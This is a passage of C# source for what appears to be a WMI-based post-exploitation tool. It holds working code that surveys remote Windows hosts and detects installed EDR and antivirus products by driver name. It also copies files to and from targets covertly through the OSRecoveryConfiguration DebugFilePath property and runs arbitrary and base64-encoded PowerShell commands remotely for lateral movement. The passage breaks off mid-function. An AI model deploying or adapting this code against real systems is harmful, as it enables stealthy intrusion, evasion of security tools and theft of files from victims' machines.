using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using ConsoleTables;
using Models.CIM;

namespace ServiceLayer.CIM
{
    public class GetMethods
    {
        public string RegGetMethod, RegSetMethod;
        public GetMethods(string regValueType)
        {
            switch (regValueType)
            {
                case "REG_SZ":
                    RegGetMethod = "GetStringValue";
                    RegSetMethod = "SetStringValue";
                    break;
                case "REG_BINARY":
                    RegGetMethod = "GetBinaryValue";
                    RegSetMethod = "SetBinaryValue";
                    break;
                case "REG_DWORD":
                    RegGetMethod = "GetDWORDValue";
                    RegSetMethod = "SetDWORDValue";
                    break;
            }
        }
    }


    public class ExecuteWmi
    {
        private static readonly Random Random = new Random();


        #region System

        public static object basic_info(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            //Query system for Operating System information
            var query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                // Display the remote computer information

                Messenger.Info("{0,-20}: {1,-10}", "Computer Name", wmiObject["csname"]);
                Messenger.Info("{0,-20}: {1,-10}", "Windows Directory", wmiObject["WindowsDirectory"]);
                Messenger.Info("{0,-20}: {1,-10}", "Operating System", wmiObject["Caption"]);
                Messenger.Info("{0,-20}: {1,-10}", "Version", wmiObject["Version"]);
                Messenger.Info("{0,-20}: {1,-10}", "Architecture", wmiObject["OSArchitecture"]);
                Messenger.Info("{0,-20}: {1,-10}", "Build Number", wmiObject["BuildNumber"]);
                Messenger.Info("{0,-20}: {1,-10}", "Build Type", wmiObject["BuildType"]);
                Messenger.Info("{0,-20}: {1,-10}", "Serial Number", wmiObject["SerialNumber"]);
                Messenger.Info("{0,-20}: {1,-10}", "Number of Users", wmiObject["NumberOfUsers"]);
                Messenger.Info("{0,-20}: {1,-10}", "Registered User", wmiObject["RegisteredUser"]);
                Messenger.Info("{0,-20}: {1,-10}", "Manufacturer", wmiObject["Manufacturer"]);
                Messenger.Info("{0,-20}: {1,-10}", "Current TimeZone", wmiObject["CurrentTimeZone"]);
                Messenger.Info("{0,-20}: {1,-10}", "Local DateTime", ManagementDateTimeConverter.ToDateTime(wmiObject["LocalDateTime"].ToString()));
            }

            return queryCollection;
        }

        public static object active_users(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var users = new List<string>();
            var query = new ObjectQuery("SELECT LogonId FROM Win32_LogonSession Where LogonType=2");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                var lQuery = new ObjectQuery("Associators of {Win32_LogonSession.LogonId=" + wmiObject["LogonId"] + "} Where AssocClass=Win32_LoggedOnUser Role=Dependent");
                var lSearcher = new ManagementObjectSearcher(scope, lQuery);
                foreach (var managementBaseObject in lSearcher.Get())
                {
                    var lWmiObject = (ManagementObject)managementBaseObject;
                    users.Add(lWmiObject["Domain"] + "\\" + lWmiObject["Name"]);
                }
            }

            Messenger.Info("{0,-15}", "Active Users");
            Messenger.Info("{0,-15}", "------------");

            var distinctUsers = users.Distinct().ToList();
            foreach (var user in distinctUsers)
                Messenger.Info("{0,-15}", user);


            return queryCollection;
        }


        public static object drive_list(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var query =
                new ObjectQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3 OR DriveType = 4 OR DriveType = 2");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            Messenger.Info("{0,-15}", "Drive List");
            Messenger.Info("{0,-15}", "------------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                Messenger.Info("{0,-15}", wmiObject["DeviceID"]);
            }

            return queryCollection;
        }


        public static object share_list(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var query = new ObjectQuery("SELECT * FROM win32_share");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            Messenger.Info("{0,-20}{1,-20}{2,-20}", "Name", "Caption", "Path");
            Messenger.Info("{0,-20}{1,-20}{2,-20}", "-----------", "-----------", "-------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                Messenger.Info("{0,-20}{1,-20}{2,-20}", wmiObject["Name"], wmiObject["Caption"], wmiObject["Path"]);
            }

            return queryCollection;
        }


        public object ifconfig(Planter planter)
        {
            // https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-networkadapterconfiguration

            var scope = planter.Connector.ConnectedWmiSession;
            var query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                if (!IsNullOrEmpty((string[])wmiObject["IPAddress"]))
                {
                    var defaultGateway = (string[])(wmiObject["DefaultIPGateway"]);
                    try
                    {
                        var dnsServersObj = wmiObject["DNSServerSearchOrder"];
                        var dnsServers = string.Empty;

                        if (dnsServersObj is IEnumerable enumerable)
                        {
                            foreach (var element in enumerable)
                            {
                                dnsServers += $"{element}, ";
                            }

                            dnsServers = dnsServers.TrimEnd(' ');
                            dnsServers = dnsServers.TrimEnd(',');
                        }

                        Messenger.Info("{0,-20}: {1,-10}", "DHCP Enabled", wmiObject["DHCPEnabled"]);
                        Messenger.Info("{0,-20}: {1,-10}", "DNS Hostname", wmiObject["DNSHostName"]);
                        Messenger.Info("{0,-20}: {1,-10}", "DNS Servers", dnsServers);
                        Messenger.Info("{0,-20}: {1,-10}", "Service Name", wmiObject["ServiceName"]);
                        Messenger.Info("{0,-20}: {1,-10}", "Description", wmiObject["Description"]);
                        Messenger.Info("{0,-20}: {1,-10}", "Default Gateway", defaultGateway[0]);
                        Messenger.Info("{0,-20}: {1,-10}", "MAC Address", wmiObject["MACAddress"]);

                    }
                    catch
                    {
                        //pass
                    }

                    foreach (var i in (string[])wmiObject["IPAddress"])
                    {
                        if (IPAddress.TryParse(i, out var address))
                        {
                            switch (address.AddressFamily)
                            {
                                case System.Net.Sockets.AddressFamily.InterNetwork:
                                    Messenger.Info("{0,-20}: {1,-10}", "IP Address", address);
                                    break;
                                default:
                                    break;
                            }
                        }
                    }
                }
            }

            return queryCollection;
        }


        /// <summary>
        /// Returns installed programs, x86
        /// </summary>
        /// <param name="planter"></param>
        /// <returns></returns>
        public object installed_programs(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var query = new ObjectQuery("SELECT * FROM Win32_Product");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            Messenger.Info("{0,-45}{1,-30}{2,20}{3,30}", "Application", "InstallDate", "Version", "Vendor");
            Messenger.Info("{0,-45}{1,-30}{2,20}{3,30}", "-----------", "-----------", "-------", "------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                if (wmiObject["Name"] != null)
                {
                    var name = (string)wmiObject["Name"];

                    if (string.IsNullOrEmpty(name))
                        continue;

                    if (name.Length > 35)
                        name = Truncate(name, 35) + "...";

                    try
                    {
                        Messenger.Info("{0,-45}{1,-30}{2,20}{3,30}", name, DateTime.ParseExact((string)wmiObject["InstallDate"], "yyyyMMdd", null), wmiObject["Version"], wmiObject["Vendor"]);
                    }
                    catch
                    {
                        //value probably doesn't exist, so just pass
                    }
                }
            }

            return queryCollection;
        }

        public object Win32Shutdown(Planter planter)
        {
            // This handles logoff, reboot/restart, and shutdown/poweroff
            var scope = planter.Connector.ConnectedWmiSession;
            var command = planter.Commander.Command;

            var query = new SelectQuery("Win32_OperatingSystem");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                // Obtain in-parameters for the method
                var inParams = wmiObject.GetMethodParameters("Win32Shutdown");

                switch (command)
                {
                    case "logoff":
                    case "logout":
                        inParams["Flags"] = 4;
                        break;
                    case "reboot":
                    case "restart":
                        inParams["Flags"] = 6;
                        break;
                    case "power_off":
                    case "shutdown":
                        inParams["Flags"] = 5;
                        break;
                }

                // Execute the method and obtain the return values.
                //var outParams = wmiObject.InvokeMethod("Win32Shutdown", inParams, null);
                var outParams = wmiObject.InvokeMethod("Win32Shutdown", inParams, null);

                var p = -1;
                if (outParams != null)
                {
                    int.TryParse(o.ToString(), out p);
                }

                if (p == 0)
                    Messenger.GoodMessage(p.ToString());
                else
                    Messenger.RedMessage(p.ToString());
            }

            return queryCollection;

        }

        public object vacant_system(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var allProcs = new List<string>();
            var query = new ObjectQuery("SELECT * FROM Win32_Process");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();


            var sb = new StringBuilder();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                allProcs.Add(wmiObject["Caption"].ToString());
            }

            // If screen saver or logon screen on
            if (allProcs.FirstOrDefault(s => s.Contains(".scr")) != null | allProcs.FirstOrDefault(s => s.Contains("LogonUI.exe")) != null)
            {
                Messenger.Info("Screensaver or Logon screen is active on " + planter.System);
            }

            else
            {
                // Get active users on the system
                var users = new List<string>();
                var newQuery = new ObjectQuery("SELECT LogonId FROM Win32_LogonSession Where LogonType=2");
                var newSearcher = new ManagementObjectSearcher(scope, newQuery);

                foreach (var o in newSearcher.Get())
                {
                    var wmiObject = (ManagementObject)o;
                    var lQuery = new ObjectQuery("Associators of {Win32_LogonSession.LogonId=" + wmiObject["LogonId"] + "} Where AssocClass=Win32_LoggedOnUser Role=Dependent");
                    var lSearcher = new ManagementObjectSearcher(scope, lQuery);
                    foreach (var managementBaseObject in lSearcher.Get())
                    {
                        var lWmiObject = (ManagementObject)managementBaseObject;
                        users.Add(lWmiObject["Name"].ToString());
                    }
                }

                Messenger.Info("Screensaver or Logon screen is active on " + planter.System);
                Messenger.Info("[-] System not vacant");

                Messenger.Info(string.Format("{0,-15}", "Active Users on " + planter.System));
                Messenger.Info(string.Format("{0,-15}", "--------------------------------"));

                var distinctUsers = users.Distinct().ToList();
                foreach (var user in distinctUsers)
                    sb.AppendLine(string.Format("{0,-15}", user));
            }

            Messenger.Info(sb.ToString());
            return queryCollection;
        }


        // Idea and some code thanks to Harley - https://github.com/harleyQu1nn/AggressorScripts/blob/master/EDR.cna
        public object edr_query(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var activeEdr = false;

            var fileQuery = new ObjectQuery(@"SELECT * FROM CIM_DataFile WHERE Path = '\\windows\\System32\\drivers\\'");
            var fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            var queryCollection = fileSearcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                var fileName = Path.GetFileName((string)wmiObject["Name"]);

                switch (fileName)
                {
                    case "FeKern.sys":
                    case "WFP_MRT.sys":
                        Messenger.RedMessage("FireEye Found!");
                        activeEdr = true;
                        break;

                    case "eaw.sys":
                        Messenger.RedMessage("Raytheon Cyber Solutions Found!");
                        activeEdr = true;
                        break;

                    case "rvsavd.sys":
                        Messenger.RedMessage("CJSC Returnil Software Found!");
                        activeEdr = true;
                        break;

                    case "dgdmk.sys":
                        Messenger.RedMessage("Verdasys Inc. Found!");
                        activeEdr = true;
                        break;

                    case "atrsdfw.sys":
                        Messenger.RedMessage("Altiris (Symantec) Found!");
                        activeEdr = true;
                        break;

                    case "mbamwatchdog.sys":
                        Messenger.RedMessage("Malwarebytes Found!");
                        activeEdr = true;
                        break;

                    case "edevmon.sys":
                    case "ehdrv.sys":
                        Messenger.RedMessage("ESET Found!");
                        activeEdr = true;
                        break;

                    case "SentinelMonitor.sys":
                        Messenger.RedMessage("SentinelOne Found!");
                        activeEdr = true;
                        break;

                    case "edrsensor.sys":
                    case "hbflt.sys":
                    case "bdsvm.sys":
                    case "gzflt.sys":
                    case "bddevflt.sys":
                    case "AVCKF.SYS":
                    case "Atc.sys":
                    case "AVC3.SYS":
                    case "TRUFOS.SYS":
                    case "BDSandBox.sys":
                        Messenger.RedMessage("BitDefender Found!");
                        activeEdr = true;
                        break;

                    case "HexisFSMonitor.sys":
                        Messenger.RedMessage("Hexis Cyber Solutions Found!");
                        activeEdr = true;
                        break;

                    case "CyOptics.sys":
                    case "CyProtectDrv32.sys":
                    case "CyProtectDrv64.sys":
                        Messenger.RedMessage("Cylance Inc. Found!");
                        activeEdr = true;
                        break;

                    case "aswSP.sys":
                        Messenger.RedMessage("Avast Found!");
                        activeEdr = true;
                        break;

                    case "mfeaskm.sys":
                    case "mfencfilter.sys":
                    case "epdrv.sys":
                    case "mfencoas.sys":
                    case "mfehidk.sys":
                    case "swin.sys":
                    case "hdlpflt.sys":
                    case "mfprom.sys":
                    case "MfeEEFF.sys":
                        Messenger.RedMessage("McAfee Found!");
                        activeEdr = true;
                        break;

                    case "groundling32.sys":
                    case "groundling64.sys":
                        Messenger.RedMessage("Dell Secureworks Found!");
                        activeEdr = true;
                        break;

                    case "avgtpx86.sys":
                    case "avgtpx64.sys":
                        Messenger.RedMessage("AVG Technologies Found!");
                        activeEdr = true;
                        break;

                    case "pgpwdefs.sys":
                    case "GEProtection.sys":
                    case "diflt.sys":
                    case "sysMon.sys":
                    case "ssrfsf.sys":
                    case "emxdrv2.sys":
                    case "reghook.sys":
                    case "spbbcdrv.sys":
                    case "bhdrvx86.sys":
                    case "bhdrvx64.sys":
                    case "SISIPSFileFilter.sys":
                    case "symevent.sys":
                    case "vxfsrep.sys":
                    case "VirtFile.sys":
                    case "SymAFR.sys":
                    case "symefasi.sys":
                    case "symefa.sys":
                    case "symefa64.sys":
                    case "SymHsm.sys":
                    case "evmf.sys":
                    case "GEFCMP.sys":
                    case "VFSEnc.sys":
                    case "pgpfs.sys":
                    case "fencry.sys":
                    case "symrg.sys":
                        Messenger.RedMessage("Symantec Found!");
                        activeEdr = true;
                        break;

                    case "SAFE-Agent.sys":
                        Messenger.RedMessage("SAFE-Cyberdefense Found!");
                        activeEdr = true;
                        break;

                    case "CybKernelTracker.sys":
                        Messenger.RedMessage("CyberArk Software Found!");
                        activeEdr = true;
                        break;

                    case "klifks.sys":
                    case "klifaa.sys":
                    case "Klifsm.sys":
                        //case "klflt.sys": // added 2021 Aug
                        //case "klim6.sys": // added 2021 Aug
                        Messenger.RedMessage("Kaspersky Found!");
                        activeEdr = true;
                        break;

                    case "SAVOnAccess.sys":
                    case "savonaccess.sys":
                    case "sld.sys":
                        Messenger.RedMessage("Sophos Found!");
                        activeEdr = true;
                        break;

                    case "ssfmonm.sys":
                        Messenger.RedMessage("Webroot Software, Inc. Found!");
                        activeEdr = true;
                        break;

                    case "CarbonBlackK.sys":
                    case "carbonblackk.sys":
                    case "Parity.sys":
                    case "cbk7.sys":
                    case "cbstream.sys":
                        Messenger.RedMessage("Carbon Black Found!");
                        activeEdr = true;
                        break;

                    case "CRExecPrev.sys":
                        Messenger.RedMessage("Cybereason Found!");
                        activeEdr = true;
                        break;

                    case "im.sys":
                    case "CSAgent.sys":
                    case "CSBoot.sys":
                    case "CSDeviceControl.sys":
                    case "cspcm2.sys":
                        Messenger.RedMessage("CrowdStrike Found!");
                        activeEdr = true;
                        break;

                    case "cfrmd.sys":
                    case "cmdccav.sys":
                    case "cmdguard.sys":
                    case "CmdMnEfs.sys":
                    case "MyDLPMF.sys":
                        Messenger.RedMessage("Comodo Security Solutions Found!");
                        activeEdr = true;
                        break;

                    case "PSINPROC.SYS":
                    case "PSINFILE.SYS":
                    case "amfsm.sys":
                    case "amm8660.sys":
                    case "amm6460.sys":
                        Messenger.RedMessage("Panda Security Found!");
                        activeEdr = true;
                        break;

                    case "fsgk.sys":
                    case "fsatp.sys":
                    case "fshs.sys":
                        Messenger.RedMessage("F-Secure Found!");
                        activeEdr = true;
                        break;

                    case "esensor.sys":
                        Messenger.RedMessage("Endgame Found!");
                        activeEdr = true;
                        break;

                    case "csacentr.sys":
                    case "csaenh.sys":
                    case "csareg.sys":
                    case "csascr.sys":
                    case "csaav.sys":
                    case "csaam.sys":
                        Messenger.RedMessage("Cisco Found!");
                        activeEdr = true;
                        break;

                    case "TMUMS.sys":
                    case "hfileflt.sys":
                    case "TMUMH.sys":
                    case "AcDriver.sys":
                    case "SakFile.sys":
                    case "SakMFile.sys":
                    case "fileflt.sys":
                    case "TmEsFlt.sys":
                    case "tmevtmgr.sys":
                    case "TmFileEncDmk.sys":
                        Messenger.RedMessage("Trend Micro Inc Found!");
                        activeEdr = true;
                        break;

                    case "epregflt.sys":
                    case "medlpflt.sys":
                    case "dsfa.sys":
                    case "cposfw.sys":
                        Messenger.RedMessage("Check Point Software Technologies Found!");
                        activeEdr = true;
                        break;

                    case "psepfilter.sys":
                    case "cve.sys":
                        Messenger.RedMessage("Absolute Found!");
                        activeEdr = true;
                        break;

                    case "brfilter.sys":
                        Messenger.RedMessage("Bromium Found!");
                        activeEdr = true;
                        break;

                    case "LRAgentMF.sys":
                        Messenger.RedMessage("LogRhythm Found!");
                        activeEdr = true;
                        break;

                    case "libwamf.sys":
                        Messenger.RedMessage("OPSWAT Inc Found!");
                        activeEdr = true;
                        break;
                }
            }

            if (!activeEdr)
                Messenger.Info("No EDR vendors found, tread carefully");

            return true;
        }


        #endregion


        #region FILE OPERATIONS

        public object cat(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var path = planter.Commander.File;

            if (!CheckForFile(path, scope, verbose: true))
            {
                Messenger.RedMessage("[-] Specified file does not exist, not running PS runspace\n");
                return null;
            }

            Messenger.GoodMessage("[+] Printing file: " + path);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            // https://twitter.com/mattifestation/status/1220713684756049921 but modified :)
            var options = new ObjectGetOptions();
            var pather = new ManagementPath($"\\\\{planter.Connector.SystemToConn}\\root\\Microsoft\\Windows\\Powershellv3");
            var classInstance = new ManagementClass(scope, pather, options);
            var newInstance = classInstance.CreateInstance();
            if (newInstance != null)
            {
                newInstance["InstanceID"] = path;
                newInstance.Put();
            }

            var searcher = new ManagementObjectSearcher("root\\Microsoft\\Windows\\Powershellv3", $"SELECT * FROM PS_ModuleFile WHERE InstanceID = {path}");

            foreach (var o in searcher.Get())
            {
                var queryObj = (ManagementObject) o;
                if (queryObj["FileData"] == null)
                    return true;

                var arrFileData = (byte[]) (queryObj["FileData"]);

                var s = Encoding.UTF8.GetString(arrFileData, 0, arrFileData.Length).TrimStart('\0').TrimStart('\t');
                Messenger.Info(s);
            }
            return true;
        }

        public object copy(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var startPath = planter.Commander.File;
            var endPath = planter.Commander.FileTo;

            if (!CheckForFile(startPath, scope, verbose: true))
            {
                //Make sure the file actually exists before doing any more work. I hate doing work with no goal
                Messenger.RedMessage("[-] Specified file does not exist, please specify a file on the remote machine that exists\n");
                return null;
            }

            if (CheckForFile(endPath, scope, verbose: false))
            {
                //Won't work if the resulting file exists
                Messenger.RedMessage( "[-] Specified copy to file exists, please specify a file to copy to on the remote system that does not exist\n");
                return null;
            }

            Messenger.GoodMessage("[+] Copying file: " + startPath + " to " + endPath);
            Messenger.GoodMessage("--------------------------------------------------------\n");
            var newPath = startPath.Replace("\\", "\\\\");
            var newEndPath = endPath.Replace("\\", "\\\\");

            var query = new ObjectQuery($"SELECT * FROM CIM_DataFile Where Name='{newPath}' ");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                // Obtain in-parameters for the method
                var inParams = wmiObject.GetMethodParameters("Copy");

                inParams["FileName"] = newEndPath;

                // Execute the method and obtain the return values.
                var outParams = wmiObject.InvokeMethod("Copy", inParams, null);
            }

            return queryCollection;
        }

        public object download(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var downloadPath = planter.Commander.File;
            var writePath = planter.Commander.FileTo;

            if (!CheckForFile(downloadPath, scope, verbose: true))
            {
                //Messenger.RedMessage("[-] Specified file does not exist, not running PS runspace\n");
                return null;
            }

            var originalWmiProperty = GetOsRecovery(scope);
            var wsman = true;

            Messenger.GoodMessage("[+] Downloading file: " + downloadPath);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (!planter.Commander.NoPS)
            {
                if (wsman == true)
                {
                    // We can modify this later easily to pass wsman if needed
                    using (var powershell = PowerShell.Create())
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                                powershell.Runspace = RunspaceCreate(planter);
                            else
                                powershell.Runspace = RunspaceCreateLocal();
                        }
                        catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                        {
                            wsman = false;
                        }

                        if (powershell.Runspace.ConnectionInfo != null)
                        {
                            var command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath + "'";
                            const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
                            const string command3 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                            powershell.Commands.AddScript(command1, false);
                            powershell.Commands.AddScript(command2, false);
                            powershell.Commands.AddScript(command3, false);
                            powershell.Invoke();
                        }
                        else
                            wsman = false;
                    }
                }

                if (wsman == false)
                {
                    // WSMAN not enabled on the remote system, use another method
                    var options = new ObjectGetOptions();
                    var pather = new ManagementPath("Win32_Process");
                    var classInstance = new ManagementClass(scope, pather, options);
                    var inParams = classInstance.GetMethodParameters("Create");

                    var encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
                                         "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                    var fullCommand = "powershell -enc " + encodedCommandB64;

                    inParams["CommandLine"] = fullCommand;

                    var outParams = classInstance.InvokeMethod("Create", inParams, null);

                }

                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, scope);

                //Get the contents of the file in the DebugFilePath prop
                var fileOutput = GetOsRecovery(scope).Split(',');

                //Create list for bytes
                var outputList = new List<byte>();

                //Convert from int (bytes) to byte
                foreach (var integer in fileOutput)
                {
                    try
                    {
                        var a = (byte)Convert.ToInt32(integer);
                        outputList.Add(a);
                    }
                    catch
                    {
                        //pass
                    }
                }

                //Save to local dir if no directory specified
                if (string.IsNullOrEmpty(writePath))
                    writePath = Path.GetFileName(downloadPath);

                File.WriteAllBytes(writePath, outputList.ToArray());

                SetOsRecovery(scope, originalWmiProperty);
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            }

            return true;
        }

        public object ls(Planter planter)
        {
            var path = planter.Commander.Directory;
            Messenger.GoodMessage("[+] Listing directory: " + path + "\n");

            ls_file(planter, true);
            return ls_dir(planter, true);
        }

        public object search(Planter planter)
        {
            var path = planter.Commander.Directory;
            var file = planter.Commander.File;

            Messenger.GoodMessage($"[+] Searching for file like '{file}' within directory {path} \n");

            // Not a recursive search. Good.
            if (!path.Contains("*"))
            {
                var queryCollection = ProcessFileSearchRequest(planter);

                foreach (var o in queryCollection)
                {
                    var wmiObject = (ManagementObject)o;

                    // Write all files to screen
                    Messenger.Info("{0}", (string)wmiObject["Name"]);
                }
                return queryCollection;
            }


            var folders = ls_dir(planter);

            foreach (var obj in folders)
            {
                var dirObject = (ManagementObject)obj;

                var dirPath = dirObject["Name"]?.ToString();
                if (string.IsNullOrEmpty(dirPath))
                    continue;

                var queryCollection = ProcessFileSearchRequest(planter, dirPath);

                foreach (var o in queryCollection)
                {
                    var wmiObject = (ManagementObject)o;

                    // Write all files to screen
                    Messenger.Info("{0}", (string)wmiObject["Name"]);
                }
            }

            return folders;
        }


        public object upload(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var uploadFile = planter.Commander.File;
            var writePath = planter.Commander.FileTo;

            if (!File.Exists(uploadFile))
            {
                Messenger.RedMessage("[-] Specified local file does not exist, not running PS runspace\n");
                return null;
            }

            var originalWmiProperty = GetOsRecovery(scope);
            var wsman = true;

            Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
            Messenger.GoodMessage("--------------------------------------------------------------------\n");

            if (!planter.Commander.NoPS)
            {
                var intList = new List<int>();
                var uploadFileBytes = File.ReadAllBytes(uploadFile);

                //Convert from byte to int (bytes)
                foreach (var uploadByte in uploadFileBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(scope, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, scope);

                if (wsman == true)
                {
                    // We can modify this later easily to pass wsman if needed
                    using (var powershell = PowerShell.Create())
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                                powershell.Runspace = RunspaceCreate(planter);
                            else
                                powershell.Runspace = RunspaceCreateLocal();
                        }
                        catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                        {
                            wsman = false;
                        }

                        if (powershell.Runspace.ConnectionInfo != null)
                        {
                            const string command1 =
                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
                            const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
                            var command3 =
                                @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                                writePath + "' -Value $decoded";

                            powershell.Commands.AddScript(command1, false);
                            powershell.Commands.AddScript(command2, false);
                            powershell.Commands.AddScript(command3, false);
                            powershell.Invoke();
                        }
                        else
                            wsman = false;
                    }
                }

                if (wsman == false)
                {
                    // WSMAN not enabled on the remote system, use another method
                    var options = new ObjectGetOptions();
                    var pather = new ManagementPath("Win32_Process");
                    var classInstance = new ManagementClass(scope, pather, options);
                    var inParams = classInstance.GetMethodParameters("Create");

                    var encodedCommand =
                        "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                        writePath + "' -Value $decoded";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                    inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

                    var outParams = classInstance.InvokeMethod("Create", inParams, null);

                    // Give it a second to write
                    Thread.Sleep(1000);
                }

                // Set OSRecovery back to normal pls
                SetOsRecovery(scope, originalWmiProperty);
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            }

            return true;
        }

      
        #endregion


        #region Lateral Movement Facilitation

        public object command_exec(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var command = planter.Commander.Execute;
            string[] newProcs = { "powershell.exe", "notepad.exe", "cmd.exe" };

            // Create a timeout for creating a new process
            var timeout = new TimeSpan(0, 0, 30);

            var originalWmiProperty = GetOsRecovery(scope);
            var wsman = true;
            var noDebugCheck = newProcs.Any(command.Split(' ')[0].ToLower().Contains);


            Messenger.GoodMessage("[+] Executing command: " + planter.Commander.Execute);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (!planter.Commander.NoPS)
            {
                // We can modify this later easily to pass wsman (WinRM) if needed
                using (var powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.System))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                        {
                            powershell.Runspace = RunspaceCreateLocal();
                            powershell.AddCommand(command);
                            var result = powershell.Invoke();
                            foreach (var a in result)
                            {
                                Messenger.Info(a.ToString());
                            }

                            return true;
                        }
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                        goto GetOut; // Do this so we're not doing below work when we don't need to
                    }

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        var command1 = "$data = (" + command + " | Out-String).Trim()";
                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
                        const string command3 =
                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                        powershell.Commands.AddScript(command1, false);
                        powershell.Commands.AddScript(command2, false);
                        powershell.Commands.AddScript(command3, false);

                        // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
                        if (noDebugCheck)
                        {
                            // start the timer and get a timeout
                            var startTime = DateTime.Now;
                            var asyncPs = powershell.BeginInvoke();

                            while (asyncPs.IsCompleted == false)
                            {
                                //Messenger.Info("Waiting for pipeline to finish...");
                                Thread.Sleep(10000);

                                // Check on our timeout here
                                var elasped = DateTime.Now.Subtract(startTime);
                                if (elasped > timeout)
                                    break;
                            }
                            //powershell.EndInvoke(asyncPs);
                        }
                        else
                            powershell.Invoke();
                    }
                    else
                        wsman = false;
                }

                GetOut:
                if (!wsman)
                {
                    if (string.IsNullOrEmpty(planter.System))
                    {
                        try
                        {
                            var procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
                            {
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

